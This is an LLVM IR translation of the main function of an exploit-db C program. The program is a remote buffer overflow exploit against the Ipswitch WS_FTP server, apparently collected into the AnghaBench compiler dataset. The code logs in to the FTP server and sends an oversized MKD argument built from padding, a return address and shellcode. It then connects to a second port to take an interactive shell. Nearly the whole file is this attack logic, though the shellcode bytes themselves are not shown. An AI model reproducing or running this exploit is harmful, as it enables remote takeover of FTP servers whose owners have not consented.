; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_664.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_664.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [67 x i8] c"***Ipswitch WS_FTP Remote buffer overflow exploit by NoPh0BiA.***\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [21 x i8] c"Usage: IP USER PASS\0A\00", align 1
@RET = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [19 x i8] c"USER %s\0D\0APASS %s\0D\0A\00", align 1
@PORT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [20 x i8] c"[x] Sending Login..\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"done.\0A\00", align 1
@.str.5 = private unnamed_addr constant [23 x i8] c"[x] Sending bad code..\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"MKD \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [47 x i8] c"[x] Checking if exploitation was successful..\0A\00", align 1
@RPORT = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [13 x i8] c"[x] 0wn3d!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %14 = call i32 @printf(i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str, i64 0, i64 0))
  %15 = load i32, i32* %3, align 4
  %16 = icmp slt i32 %15, 4
  br i1 %16, label %17, label %21

17:                                               ; preds = %2
  %18 = load i32, i32* @stderr, align 4
  %19 = call i32 @fprintf(i32 %18, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0))
  %20 = call i32 @exit(i32 0) #3
  unreachable

21:                                               ; preds = %2
  %22 = call i8* @malloc(i32 954)
  store i8* %22, i8** %5, align 8
  %23 = call i8* @malloc(i32 519)
  store i8* %23, i8** %6, align 8
  %24 = call i8* @malloc(i32 32)
  store i8* %24, i8** %7, align 8
  %25 = load i8**, i8*** %4, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  store i8* %27, i8** %8, align 8
  %28 = call i8* @malloc(i32 32)
  store i8* %28, i8** %9, align 8
  %29 = call i8* @malloc(i32 32)
  store i8* %29, i8** %10, align 8
  %30 = call i8* @malloc(i32 32)
  store i8* %30, i8** %11, align 8
  %31 = load i8*, i8** %11, align 8
  %32 = call i32 @memset(i8* %31, i32 0, i32 32)
  %33 = load i8*, i8** %9, align 8
  %34 = call i32 @memset(i8* %33, i32 0, i32 32)
  %35 = load i8*, i8** %10, align 8
  %36 = call i32 @memset(i8* %35, i32 0, i32 32)
  %37 = load i8*, i8** %5, align 8
  %38 = call i32 @memset(i8* %37, i32 0, i32 954)
  %39 = load i8*, i8** %6, align 8
  %40 = call i32 @memset(i8* %39, i32 65, i32 519)
  %41 = load i8*, i8** %7, align 8
  %42 = call i32 @memset(i8* %41, i32 66, i32 32)
  %43 = load i8*, i8** %9, align 8
  %44 = load i8**, i8*** %4, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 2
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @strcpy(i8* %43, i8* %46)
  %48 = load i8*, i8** %10, align 8
  %49 = load i8**, i8*** %4, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 3
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @strcpy(i8* %48, i8* %51)
  %53 = load i8*, i8** %5, align 8
  %54 = load i8*, i8** %6, align 8
  %55 = call i32 @strcat(i8* %53, i8* %54)
  %56 = load i8*, i8** %5, align 8
  %57 = load i8*, i8** @RET, align 8
  %58 = call i32 @strcat(i8* %56, i8* %57)
  %59 = load i8*, i8** %5, align 8
  %60 = load i8*, i8** %7, align 8
  %61 = call i32 @strcat(i8* %59, i8* %60)
  %62 = load i8*, i8** %5, align 8
  %63 = load i8*, i8** @shellcode, align 8
  %64 = call i32 @strcat(i8* %62, i8* %63)
  %65 = load i8*, i8** %11, align 8
  %66 = load i8*, i8** %9, align 8
  %67 = load i8*, i8** %10, align 8
  %68 = call i32 @sprintf(i8* %65, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0), i8* %66, i8* %67)
  %69 = load i8*, i8** %8, align 8
  %70 = load i32, i32* @PORT, align 4
  %71 = call i32 @conn(i8* %69, i32 %70)
  store i32 %71, i32* %12, align 4
  %72 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0))
  %73 = load i32, i32* %12, align 4
  %74 = load i8*, i8** %11, align 8
  %75 = load i8*, i8** %11, align 8
  %76 = call i32 @strlen(i8* %75)
  %77 = call i32 @write(i32 %73, i8* %74, i32 %76)
  %78 = call i32 @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %79 = call i32 @sleep(i32 2)
  %80 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0))
  %81 = load i32, i32* %12, align 4
  %82 = call i32 @write(i32 %81, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i32 4)
  %83 = load i32, i32* %12, align 4
  %84 = load i8*, i8** %5, align 8
  %85 = call i32 @write(i32 %83, i8* %84, i32 954)
  %86 = load i32, i32* %12, align 4
  %87 = call i32 @write(i32 %86, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i32 2)
  %88 = call i32 @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %89 = call i32 @sleep(i32 2)
  %90 = load i32, i32* %12, align 4
  %91 = call i32 @close(i32 %90)
  %92 = call i32 @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.8, i64 0, i64 0))
  %93 = load i8*, i8** %8, align 8
  %94 = load i32, i32* @RPORT, align 4
  %95 = call i32 @conn(i8* %93, i32 %94)
  store i32 %95, i32* %13, align 4
  %96 = call i32 @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i64 0, i64 0))
  %97 = load i32, i32* %13, align 4
  %98 = call i32 @shell(i32 %97)
  %99 = load i32, i32* %13, align 4
  %100 = call i32 @close(i32 %99)
  ret i32 0
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*) #1

declare dso_local i32 @conn(i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @shell(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
